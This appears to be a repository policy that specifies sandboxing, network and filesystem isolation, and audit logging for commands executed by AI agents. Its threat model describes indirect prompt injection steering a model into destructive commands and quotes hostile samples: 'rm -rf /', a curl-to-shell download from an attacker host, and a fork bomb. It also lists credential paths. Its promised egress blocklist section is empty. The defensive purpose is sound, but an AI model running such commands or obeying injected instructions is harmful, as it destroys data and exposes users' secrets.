# Containerized Execution Sandbox Specification

> **Standard:** Late-2026 Agent Skills Specification (`agentskills.io`)  
> **Status:** Mandatory Active Policy  
> **Scope:** Runtime Isolation for Terminal Invocations, Automated Builds, and Dynamic Code Execution  
> **Security Baseline:** OWASP Top 10 for Agentic Applications 2026 (ASI05 — Unexpected Code Execution)

---

## 1. Overview and Purpose

Modern autonomous agents execute commands, build pipelines, run test suites, and execute dynamic code to solve engineering problems. While text-based rules advisory guidelines exist in [Code Rules](../rules/code.md) and identity authorization is checked via [Action Boundaries](action-boundaries.yaml) and [check-policy.py](../scripts/hooks/check-policy.py), authorization alone is insufficient.

### 1.1 Separation of Authorization and Physical Isolation

- **Identity Authorization (Who):** Evaluates whether an active agent role (e.g., `backend-developer`, `qa-engineer`) is authorized to request an action verb (`run_build`, `run_tests`, `execute_command`).
- **Physical Execution Isolation (Where & How):** Mandates that once authorized, the operation must execute strictly inside a physically constrained, containerized, or virtualized execution sandbox. Unsandboxed host execution of agent-generated or untrusted code is prohibited.

Executing dynamic code directly on the host system exposes developer workstations, build runners, and production orchestrators to remote code execution (RCE), host environment variable exfiltration, and local network lateral movement. This specification establishes universal isolation boundaries, resource quotas, network levels, and containment rules across the repository.

### 1.2 Scope of Enforcement

This policy governs all invocations of high-risk tools and actions identified in [MCP Tool Map](mcp-tool-map.yaml):
- `run_tests` (e.g., `pytest`, `npm test`, `cargo test`, `go test`, `vitest`)
- `run_build` (e.g., `npm run build`, `cargo build`, `go build`, `make`)
- `execute_command`, `run_terminal_cmd`, `shell`
- Package management and installation commands (`pip install`, `npm install`, `cargo add`)
- Dynamic code interpreters (Python REPL, Node.js VM, Bash subshells, Jupyter kernels)
- Autonomous script execution generated by LLM reasoning loops

## 2. Threat Model and OWASP ASI05

OWASP Top 10 for Agentic Applications 2026 designates **ASI05: Unexpected Code Execution** as a critical vulnerability class. In agentic workflows, LLMs generate shell commands or code strings dynamically based on user prompts, repository content, web fetches, or multi-agent delegations.

### 2.1 Threat Vectors in Agentic Execution

1. **Indirect Prompt Injection (ASI01 → ASI05):** Adversarial instructions embedded in untrusted external content (issues, PR descriptions, crawled webpages, third-party documentation) trick the LLM into generating destructive terminal commands (e.g., `rm -rf /`, `curl attacker.com/malware | sh`).
2. **Supply Chain Compromise (ASI04 → ASI05):** Malicious dependencies or post-install lifecycle scripts (`setup.py`, `package.json` `postinstall`) execute arbitrary code upon invocation of package managers.
3. **Shell Metacharacter Chaining:** String interpolation of user or tool arguments enables command injection via shell operators (`;`, `&&`, `||`, `|`, `` ` `` , `$(...)`).
4. **Host Secret and Identity Theft:** Malicious code accesses host environment variables (`AWS_ACCESS_KEY_ID`, `CLOUDFLARE_API_TOKEN`, `GITHUB_TOKEN`), developer credentials (`~/.ssh/`, `~/.aws/`), or Docker control sockets (`/var/run/docker.sock`).
5. **Server-Side Request Forgery (SSRF):** Sandboxed processes query internal microservices, private VPC subnets (RFC 1918), or Cloud Instance Metadata Services (`http://169.254.169.254`).
6. **Denial of Service (Resource Starvation):** Infinite recursion, CPU spinlocks, unconstrained memory allocation, or fork bombs (`:(){ :|:& };:`) exhaust host compute resources.

### 2.3 The Five Core ASI05 Controls

- **Control ASI05-1 (Mandatory Sandbox Boundary):** All dynamic code execution, automated testing, and unverified terminal commands must execute inside an isolated sandbox tier. Direct host OS execution is prohibited.
- **Control ASI05-2 (Argument Array Parameterization):** Process creation must use explicit, tokenized argument arrays (e.g., `["pytest", "-v", "tests/"]`). Executing shell strings via `bash -c` or `eval` is forbidden.
- **Control ASI05-3 (Zero-Trust Secret Isolation):** Host environment variables must never be inherited. Sandboxes start in an empty environment, receiving only explicitly declared, non-sensitive build variables.
- **Control ASI05-4 (Syscall & Seccomp Filtering):** Sandboxes must run under strict seccomp-bpf filters blocking dangerous system calls (`ptrace`, `bpf`, `mount`, `reboot`, `init_module`, `kexec_load`).
- **Control ASI05-5 (Forensic Audit Trail & Ephemeral Teardown):** Every sandbox invocation emits an OCSF 99001 event and OpenTelemetry trace span. Sandboxes are destroyed immediately on task completion (`destroy()`).

## 3. Multi-Tier Isolation Architecture

Different development tasks require distinct security guarantees, startup latencies, and toolchain dependencies. This specification establishes a 4-Tier Isolation Architecture.

### 3.1 Tier 1: WebAssembly / WASI (Software-Fault Isolation)

- **Target Workloads:** Pure algorithmic computation, regex evaluation, AST parsing, schema transformation, template compilation, cryptographic hashing.
- **Startup Latency:** `< 5 ms`.
- **Isolation Mechanism:** Software-Fault Isolation (SFI) within a memory-safe linear address space. No direct access to host kernel syscalls; capabilities are imported explicitly via WASI interfaces.
- **Standard Runtimes:** Wasmtime, Wasmer, V8 Isolates.
- **Deployment Guidance:** Preferred for fast-path in-memory operations where full Linux OS dependencies are unnecessary.

### 3.2 Tier 2: Hardened OCI / Docker Containers (Local and CI Workhorse)

- **Target Workloads:** Repository compilation (`run_build`), unit and integration test suites (`run_tests`), linters, package builds, local agent workflows.
- **Startup Latency:** `500 ms – 2.0 s`.
- **Isolation Mechanism:** Linux kernel namespaces (PID, mount, net, ipc, user), cgroups v2 resource controllers, custom seccomp BPF filters, rootless execution.
- **Hardened Runtime Options:** Standard `runc` with hardening flags, or sandboxed kernel runtimes such as Google gVisor (`runsc`) or Kata Containers.
- **Required Flags:**
  ```bash
  docker run --rm \
    --read-only \
    --user 1000:1000 \
    --security-opt=no-new-privileges:true \
    --cap-drop=ALL \
    --network=none \
    --memory=512m --memory-swap=512m \
    --cpus=1.0 \
    --pids-limit=64 \
    --tmpfs /tmp:size=128M,noexec,nosuid,nodev \
    -v /path/to/ephemeral/scratchpad:/workspace:rw \
    custom-sandbox-runner:2026
  ```

### 3.3 Tier 3: Hardware-Virtualization MicroVMs (Kernel Separation)

- **Target Workloads:** Execution of untrusted third-party code, adversarial security test fixtures, automated PR evaluation, untrusted dependency testing, multi-tenant agent execution.
- **Startup Latency:** `5 ms – 150 ms`.
- **Isolation Mechanism:** Hardware-assisted virtualization (`/dev/kvm`), distinct guest Linux kernel, dedicated guest memory, minimal virtualized device model, jailer chroot confinement.
- **Standard Runtimes:** AWS Firecracker, Cloud Hypervisor, Fly Machines.
- **Deployment Guidance:** Mandatory when executing code from untrusted external contributors or running multi-tenant swarms where shared kernel exploits (dirty COW, eBPF bugs) represent an unacceptable risk.

### 3.4 Tier 4: Managed Cloud Sandboxes (Serverless and Edge Swarms)

- **Target Workloads:** Edge agent execution, serverless code interpreters (Jupyter / Python data science), agents lacking local Docker/KVM privileges.
- **Startup Latency:** `100 ms – 1.5 s` (warm pool).
- **Isolation Mechanism:** Remote multi-tenant microVM/container infrastructure managed by specialized infrastructure providers via secure RPC/REST APIs.
- **Reference Implementations:**
  - **Cloudflare Workers Sandbox SDK:** Cloudflare Containers / Durable Objects integration via `@cloudflare/sandbox` (see [Sandbox SDK](../skills/platform/sandbox-sdk/SKILL.md)).
  - **E2B Code Interpreter SDK:** Dedicated secure cloud sandboxes for autonomous AI agents.
  - **Modal / Fly.io:** Ephemeral cloud compute containers.

### 3.5 Tier Selection Decision Matrix

| Task Characteristics | Recommended Tier | Fallback Tier | Security Guarantee |
|:---|:---|:---|:---|
| Pure data parsing, regex, AST manipulation | **Tier 1 (WASI)** | Tier 2 (Docker) | Memory-safe linear isolation |
| Local unit/integration tests & builds | **Tier 2 (Docker/gVisor)** | Tier 4 (Cloud Sandbox) | Linux namespace & cgroup confinement |
| Adversarial test cases, unverified 3rd-party code | **Tier 3 (MicroVM)** | Tier 2 with gVisor (`runsc`) | Hardware KVM kernel isolation |
| Cloud/Edge AI agent, remote code interpreter | **Tier 4 (Cloud Sandbox)** | Tier 2 (Docker) | Cloud-managed remote ephemeral VM |

## 4. Resource Isolation Constraints

Unchecked agent code can enter infinite loops, generate recursive subprocesses, or consume all host memory. The following constraints are mandatory for all sandboxed runs.

### 4.1 Quota Specification Matrix

| Resource Metric | Default Limit | Maximum Ceiling | Enforcement Mechanism | Failure Action |
|:---|:---|:---|:---|:---|
| **CPU Allocation** | 1.0 vCPU | 2.0 vCPU | cgroups v2 (`cpu.max=100000 100000`) | CFS throttling |
| **CPU Execution Time** | 30 seconds (`timeout_ms: 30000`) | 300 seconds (compilation) | Watchdog timer process | Hard `SIGKILL` (9) |
| **RAM (Memory)** | 512 MB (`--memory=512m`) | 2048 MB (`--memory=2048m`) | cgroups v2 (`memory.max`) | OOM Killer invocation |
| **Swap Space** | 0 MB (Disabled) | 0 MB (Strictly Disabled) | `--memory-swap=512m` | N/A (swap prevented) |
| **PIDs / Threads** | 64 (`--pids-limit=64`) | 128 (heavy test runners) | cgroups v2 (`pids.max`) | `EAGAIN` fork failure |
| **Storage (Overlay)** | 500 MB | 1000 MB | Ephemeral container rootfs | `ENOSPC` disk error |
| **Scratchpad Volume**| 2 GB | 5 GB | Mount volume quota | `ENOSPC` disk error |
| **Inode Count** | 50,000 inodes | 100,000 inodes | Filesystem mount options | `ENOSPC` inode exhausted |
| **`/tmp` Filesystem** | 128 MB | 256 MB | `tmpfs (size=128M,noexec,nosuid,nodev)` | In-memory limit |

### 4.2 Anti-DoS and Lifecycle Controls

- **Swap Prohibition:** Swap must remain strictly disabled. Enabling swap allows a runaway process to degrade host SSD performance and cause system-wide I/O starvation.
- **Hard Timeout SIGKILL:** On timeout expiration (default 30 seconds), the supervisor process issues `SIGTERM` followed after 200 ms by an uncatchable `SIGKILL` (signal 9) to all processes in the sandbox PID group.
- **Fail-Closed OOM Policy:** An out-of-memory kill event must immediately mark the test or build step as failed. The failure report must explicitly document the memory breach (`OOMKilled: true`).

## 5. Network Isolation Policies

Network egress is the primary channel for credential exfiltration, Command and Control (C2) communication, and Server-Side Request Forgery (SSRF).

### 5.1 Level 0: Air-Gapped / Network None (Default)

- **Enforcement:** `--network=none`
- **Applicability:** Mandatory default for `run_tests`, dynamic code evaluation, linter execution, and local build verification.
- **Policy:** The sandbox network namespace contains only the loopback interface with no external connectivity. All external requests return immediate network unreachable errors.
- **Rationale:** Prevents tests or executed code from downloading secondary payloads, transmitting environment data to external servers, or probing local networks.

### 5.2 Level 1: Restricted Proxy Allowlist

- **Applicability:** Permitted strictly during explicit, pre-authorized dependency installation (`install_dependency` verb) or when external API verification is contractually required.
- **Architecture:** Outbound TCP/HTTPS connections are routed through an authenticating egress filtering proxy (e.g., Envoy or Squid).
- **Domain Allowlist:** Restricted to approved public package registries:
  - `registry.npmjs.org`
  - `pypi.org`, `files.pythonhosted.org`
  - `crates.io`, `static.crates.io`
  - `proxy.golang.org`
  - `rubygems.org`
  - `repo1.maven.org`

### 5.3 Level 2: Ephemeral Host Callbacks

- **Applicability:** Cloud and Edge sandboxes (e.g., Cloudflare Workers Sandbox SDK).
- **Architecture:** The container runtime possesses zero direct internet interfaces. Outbound HTTP requests from within the sandbox are captured by host runtime bindings (e.g., `env.SANDBOX.callbacks.fetch`) and evaluated by the host application against tenant policy before dispatch.

### 5.4 Non-Bypassable Egress Blocklist

Even under Level 1 or Level 2, the following destinations must be unconditionally blocked at the network firewall / iptables layer:


## 6. Filesystem and Volume Containment

Filesystem access controls prevent malware persistence, host OS compromise, and source repository corruption.

### 6.1 Root Filesystem and Least Privilege

1. **Read-Only Root Filesystem:** Containers must run with `--read-only`. The root filesystem (`/bin`, `/usr`, `/lib`, `/etc`) cannot be written to or modified at runtime.
2. **Non-Root Execution:** Containers must run as an unprivileged user (`--user 1000:1000` or `user: sandbox`). Running as UID 0 (root) is prohibited.
3. **No Privilege Escalation:** `--security-opt=no-new-privileges:true` prevents `setuid` and `setgid` binaries from elevating capabilities.
4. **Drop All Capabilities:** `--cap-drop=ALL` removes all Linux kernel capabilities (`CAP_SYS_ADMIN`, `CAP_NET_ADMIN`, `CAP_DAC_OVERRIDE`, `CAP_RAW_IO`).

### 6.2 Prohibited Bind Mounts and Secret Sanitization

The following host paths must **never** be mounted into any sandbox:
- Host root (`/` or `C:\`)
- Host user home directory (`~`, `/home/*`, `/Users/*`, `C:\Users\*`)
- Docker or container management sockets (`/var/run/docker.sock`, `/run/podman/podman.sock`)
- Host system configuration directories (`/etc`, `/var`, `/proc`, `/sys`)
- Version control metadata directories (`.git/`)
- Sensitive configuration and credential stores (`~/.ssh`, `~/.aws`, `~/.kube`, `~/.gnupg`, `~/.config`)
- Secret environment files (`.env`, `.env.*`, `.dev.vars`, `credentials.json`)

Before mounting any repository workspace, an automated sanitization step must verify that all `.env` files and uncommitted secret artifacts are excluded from the mounted volume.

### 6.3 Ephemeral Scratchpad Lifecycle

1. **Workspace Isolation:** Project source code is mounted into the container as read-only (`:ro`), or copied into an ephemeral scratchpad volume.
2. **Dedicated Output Directory:** Build artifacts and test outputs are written to a temporary scratchpad volume mounted at `/workspace` or `/scratch`.
3. **Automated Destruction:** Upon completion of the execution task, the container and all attached scratchpad volumes are destroyed immediately. No state is persisted across agent execution turns unless explicitly requested by the user.

## 7. Runtime Parameterization and Command AST

String concatenation of shell commands is the primary cause of injection attacks (ASI05). This section mandates tokenized command execution.

### 7.1 Argument Array Parameterization

All execution tooling must invoke subprocesses using parameterized argument arrays:

```python
# CORRECT: Tokenized argument array (safe)
subprocess.run(
    ["pytest", "-v", "tests/unit/test_auth.py"],
    shell=False,
    capture_output=True,
    check=False
)

# PROHIBITED: Shell string interpolation (vulnerable to injection)
# subprocess.run(f"pytest -v {user_supplied_arg}", shell=True)
```

### 7.2 Shell Metacharacter Rejection

The orchestrator and tool wrappers must reject any argument containing dangerous shell metacharacters before dispatch:
- Command separators: `;`, `\n`, `\r`
- Pipeline and logical operators: `|`, `||`, `&`, `&&`
- Shell substitution: `` ` `` , `$(`, `${`
- Redirection operators: `>`, `>>`, `<`, `<<`
- Wildcards in unchecked contexts: `*`, `?`

If complex shell scripts must be evaluated, they must be written to a dedicated script file inside the ephemeral scratchpad and executed via an explicit interpreter invocation: `["bash", "/workspace/run-build.sh"]`.

## 8. Compliance, Telemetry, and Audit Logging

Every execution inside a sandbox must leave an immutable, structured audit trail for governance, forensic investigation, and compliance verification.

### 8.1 OCSF 99001 Audit Event Schema

Sandboxed operations emit an OCSF (Open Cybersecurity Schema Framework) class 99001 event. When invoked with `--emit-audit`, `check-policy.py` and sandbox wrappers log the event in structured JSON:

```json
{
  "class_uid": 99001,
  "category_uid": 9,
  "time": "2026-09-05T02:30:00Z",
  "activity_id": 1,
  "severity_id": 1,
  "actor": {
    "role": "backend-developer",
    "agent_id": "agent-worker-01"
  },
  "action": "run_tests",
  "sandbox": {
    "tier": "tier_2_docker",
    "runtime": "runsc-gvisor",
    "network_level": "level_0_airgap",
    "cpu_limit": 1.0,
    "memory_limit_mb": 512,
    "execution_duration_ms": 1420,
    "exit_code": 0
  },
  "command": {
    "executable": "pytest",
    "args": ["pytest", "-v", "tests/unit/test_api.py"],
    "command_hash": "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
  },
  "disposition": "allowed"
}
```

### 8.2 OpenTelemetry Trace Spans

Sandbox invocations must emit child spans adhering to the [agent-trace-span.json](../contracts/schemas/agent-trace-span.json) contract:
- `trace_id`: Propagated W3C trace context.
- `span_id`: Unique identifier for the execution step.
- `attributes.sandbox.tier`: `"tier_1"`, `"tier_2"`, `"tier_3"`, or `"tier_4"`.
- `attributes.sandbox.network`: `"level_0"`, `"level_1"`, or `"level_2"`.
- `attributes.sandbox.exit_code`: Process return code.
- `attributes.sandbox.oom_killed`: Boolean flag for memory breaches.

### 8.3 CI/CD Enforcement Gates

Automated CI/CD pipelines and repository validation workflows (e.g., `qa-validation.md`, `build-deploy.md`) enforce that:
1. All automated test runs occur inside Level 0 air-gapped containers.
2. Build commands do not access host secrets or Docker sockets.
3. Every test execution report adheres to [test-report.json](../contracts/schemas/test-report.json).
4. Any attempt to bypass the sandbox boundary results in immediate CI failure.
